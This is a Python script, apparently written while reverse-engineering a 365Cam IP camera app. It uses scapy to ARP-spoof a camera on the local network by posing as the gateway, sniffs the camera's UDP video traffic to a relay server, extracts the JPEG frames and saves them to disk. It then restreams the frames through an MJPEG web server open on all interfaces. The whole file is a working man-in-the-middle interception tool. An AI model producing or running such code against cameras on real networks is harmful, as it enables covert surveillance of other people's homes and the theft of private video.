#!/usr/bin/env python3
"""
Simple: capture camera packets directly, save JPEG frames in real-time.
No ARP spoof issue - uses the working filter from capture_camera.py
"""
from scapy.all import *
import time, os

CAM_IP = "192.168.1.148"
RELAY_IP = "49.237.71.144"
OUT = r"E:\open_camera\apk_analysis\frames"
os.makedirs(OUT, exist_ok=True)

MY_MAC = "9c:6b:00:cf:27:e7"
conf.verb = 0

frame_count = 0
latest = b''
running = True

# ARP spoof (minimal)
def spoof():
    cam = getmacbyip(CAM_IP) or "ff:ff:ff:ff:ff:ff"
    while running:
        sendp(Ether(dst=cam)/ARP(op=2, pdst=CAM_IP, hwdst=cam, psrc="192.168.1.1", hwsrc=MY_MAC), 
              iface=conf.iface, verbose=False)
        time.sleep(1)

def process(pkt):
    global frame_count, latest
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP)): return
    if pkt[IP].src != CAM_IP: return
    if pkt[IP].dst != RELAY_IP: return
    if pkt[UDP].dport != 22036: return
    
    payload = bytes(pkt[UDP].payload)
    if len(payload) < 100: return
    
    # Find JPEG SOI
    soi = payload.find(b'\xff\xd8\xff')
    if soi < 0: return
    
    # Find JPEG EOI
    eoi = payload.rfind(b'\xff\xd9')
    if eoi < soi + 200: return
    
    jpeg = payload[soi:eoi+2]
    frame_count += 1
    fname = os.path.join(OUT, f"f{frame_count:05d}.jpg")
    with open(fname, 'wb') as f:
        f.write(jpeg)
    latest = jpeg
    if frame_count % 10 == 0:
        print(f"[{frame_count}] saved {len(jpeg)}b")

# HTTP server
def httpd():
    from http.server import HTTPServer, BaseHTTPRequestHandler
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/mjpg':
                self.send_response(200)
                self.send_header('Content-Type', 'multipart/x-mixed-replace; boundary=X')
                self.end_headers()
                old = 0
                while running:
                    global frame_count, latest
                    if frame_count > old and latest:
                        self.wfile.write(b'--X\r\nContent-Type: image/jpeg\r\n')
                        self.wfile.write(f'Content-Length: {len(latest)}\r\n\r\n'.encode())
                        self.wfile.write(latest)
                        self.wfile.write(b'\r\n')
                        old = frame_count
                    time.sleep(0.05)
            elif self.path == '/':
                self.send_response(200); self.end_headers()
                self.wfile.write(f'<html><body><img src="/mjpg" style="max-width:100%"></body></html>'.encode())
    
    HTTPServer(('0.0.0.0', 8080), H).serve_forever()

print(f"Capturing {CAM_IP} -> {RELAY_IP}:22036")
print(f"Open http://localhost:8080 in browser")
print(f"Now open the 365Cam app to start streaming!")

import threading
threading.Thread(target=spoof, daemon=True).start()
threading.Thread(target=httpd, daemon=True).start()
time.sleep(1)

try:
    sniff(filter=f"host {CAM_IP}", prn=process, store=False)
except KeyboardInterrupt:
    pass
except Exception as e:
    print(f"ERR: {e}")
finally:
    running = False
    print(f"\nDone. {frame_count} frames")
